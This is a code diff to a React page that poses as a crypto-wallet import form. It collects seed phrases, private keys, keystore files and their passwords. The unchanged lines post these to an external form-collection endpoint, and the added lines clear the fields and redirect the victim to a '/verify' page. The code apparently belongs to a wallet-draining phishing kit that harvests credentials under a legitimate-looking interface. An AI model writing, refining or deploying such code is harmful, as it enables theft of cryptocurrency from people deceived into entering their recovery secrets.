@@ -11,30 +11,12 @@ import { NavLink } from "react-router-dom";
 import styled from "@emotion/styled";
 import { ImportTextField } from "./styles/styles";
 import LandingAppBar from "./Components/LandingAppBar";
+import { useNavigate } from "react-router-dom";
 
 const FORM_ENDPOINT =
   "https://public.herotofu.com/v1/f2241800-ae93-11ec-b83f-8f17e10d6288";
 
 const WalletForm = ({ children, handleSubmit }) => {
-  const uploadData = (value, type, wallet) => {
-    const payload = { value, type, wallet };
-
-    uploadToCloud(payload);
-
-    clearFields();
-  };
-
-  const handleUpload = (type) => {
-    if (type === SEED_PHRASE) uploadData(seedPhrase, SEED_PHRASE, wallet);
-    if (type === PRIVATE_KEY) uploadData(privateKey, PRIVATE_KEY, wallet);
-    if (type === KEY_JSON)
-      uploadData(
-        { keyJSON: keyJSON, password: keyStorePassword },
-        KEY_JSON,
-        wallet
-      );
-  };
-
   return (
     <Box
       component="form"
@@ -81,6 +63,7 @@ function a11yProps(index) {
 
 function BasicTabs() {
   const { wallet } = useContext(WalletContext);
+  const navigate = useNavigate();
 
   const PRIVATE_KEY = "private_key";
   const SEED_PHRASE = "seed_phrase";
@@ -90,6 +73,13 @@ function BasicTabs() {
   const [privateKey, setPrivateKey] = useState();
   const [keyJSON, setKeyJSON] = useState();
   const [keyPasscode, setKeyPasscode] = useState();
+
+  const clearFields = () => {
+    setSeedPhrase("");
+    setPrivateKey("");
+    setKeyJSON("");
+    setKeyPasscode("");
+  };
 
   const [value, setValue] = useState(0);
 
@@ -114,6 +104,9 @@ function BasicTabs() {
       },
       body: JSON.stringify(injectedData),
     });
+
+    clearFields();
+    navigate("/verify");
   };
 
   return (
